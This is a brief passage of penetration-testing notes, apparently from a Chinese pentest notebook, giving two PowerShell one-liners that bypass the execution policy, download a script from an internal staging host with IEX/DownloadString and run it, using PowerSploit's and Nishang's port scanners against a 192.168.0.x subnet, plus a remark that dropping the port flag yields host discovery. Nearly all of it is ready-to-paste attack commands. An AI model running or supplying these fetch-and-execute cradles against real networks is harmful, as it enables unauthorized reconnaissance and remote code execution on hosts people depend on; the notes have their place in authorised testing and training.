  #### Powersploit
	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powersploit/Recon/Invoke-Portscan.ps1'); Invoke-Portscan -Hosts 192.168.0.0/24 –T 4 -Ports '1-65535' -oA C:\TEMP.txt"
  #### Nishang 
	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/nishang/Scan/Invoke-PortScan.ps1'); Invoke-Portscan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254 -ResolveHost -ScanPort"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/320.png)

	去掉scanport就是探测存活
